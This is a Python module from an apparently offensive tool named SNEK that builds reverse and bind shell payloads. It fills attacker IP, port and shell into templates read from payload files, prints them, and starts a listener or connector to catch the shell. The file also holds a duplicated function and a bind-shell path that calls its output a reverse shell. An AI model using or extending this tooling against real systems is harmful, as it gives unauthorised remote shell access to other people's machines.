# Copyright 2023 2xdropout

import SNEKactions
import SNEKlistener
from termcolor import colored

def rev_shell_check():
    checkList = ['attackerPort','attackerIP','payloadVector','shell']
    
    for item in checkList:
        if SNEKactions.get_var(str(item)) is None:
            print(str(item),' is not set!')
            return False
    
    return True

def bind_shell_check():
    checkList = ['targetPort','payloadVector','shell']
    
    for item in checkList:
        if SNEKactions.get_var(str(item)) is None:
            print(str(item),' is not set!')
            return False
    
    return True    


def bind_shell_check():
    checkList = ['targetPort', 'target', 'payloadVector','shell']
    
    for item in checkList:
        if SNEKactions.get_var(str(item)) is None:
            print(str(item),' is not set!')
            return False
    
    return True


def get_payload(style):
    # Data checks
    layer = SNEKactions.get_var('layer')
    if layer == 'shells_reverse':
        if not rev_shell_check():
            print("MISSING DATA ABORTING")
            return
        else:
            if style == 'text':
                rev_shell_payload_text()
    elif layer == 'shells_bind':
        if not bind_shell_check():
            print("MISSING DATA ABORTING")
            return
        else:
            if style == 'text':
                bind_shell_payload_text()


def rev_shell_payload_text():
    os = SNEKactions.get_var('os')
    ip = SNEKactions.get_var('attackerIP')
    port = SNEKactions.get_var('attackerPort')
    vector = SNEKactions.get_var('payloadVector')
    shell = SNEKactions.get_var('shell')
    payloads = []
    payloadFile = './SNEK_Payloads/reverse.SNECK'

    # Get payloads from file
    if os in ['windows','linux']:
        with open(payloadFile,'r') as file:
            for line in file:
                if line[:1] == '#':
                    pass
                else:
                    midAss = line.split('~~')[1]
                    mid = midAss.split('~~')[0]
                    if line.split('~~')[0] == os and mid == vector:
                        payloads.append(line)
        file.close()
    else:
        with open(payloadFile,'r') as file:
            for line in file:
                midAss = line.split('~~')[1]
                mid = midAss.split('~~')[0]
                if line.split('~~')[0] == 'generic' and mid == vector:
                    payloads.append(line)
    
    for item in payloads:
        ass =  item.split('~~')[2]
        rawPayload = ass.replace("ATTACKER", str(ip))
        rawPayload = rawPayload.replace("ATTACKPORT", str(port))
        payload = rawPayload.replace("REVSHELL", str(shell))
        print(colored(payload.rstrip(),"white","on_red"))
        print(' ')
    
    print('\nUse one of the above payloads to connect to the listner and get your reverse shell!\n')

    SNEKlistener.launch_listener()


def bind_shell_payload_text():
    os = SNEKactions.get_var('os')
    port = SNEKactions.get_var('targetPort')
    vector = SNEKactions.get_var('payloadVector')
    shell = SNEKactions.get_var('shell')
    payloads = []
    payloadFile = './SNEK_Payloads/bind.SNECK'

    # Get payloads from file
    if os in ['windows','linux']:
        with open(payloadFile,'r') as file:
            for line in file:
                if line[:1] == '#':
                    pass
                else:
                    midAss = line.split('~~')[1]
                    mid = midAss.split('~~')[0]
                    if line.split('~~')[0] == os and mid == vector:
                        payloads.append(line)
        file.close()
    else:
        with open(payloadFile,'r') as file:
            for line in file:
                midAss = line.split('~~')[1]
                mid = midAss.split('~~')[0]
                if line.split('~~')[0] == 'generic' and mid == vector:
                    payloads.append(line)
    
    for item in payloads:
        ass =  item.split('~~')[2]
        rawPayload = ass.replace("TARGETPORT", str(port))
        payload = rawPayload.replace("BINDSHELL", str(shell))
        print(colored(payload.rstrip(),"white","on_red"))
        print(' ')
    
    print('\nUse one of the above payloads to connect to the listner and get your reverse shell!\n')
    input(colored('Press the "Enter" key when ready to launch the connecter', 'blue'))
    print('LAUNCHING CONNECTOR!')
    SNEKlistener.launch_connecter(port)
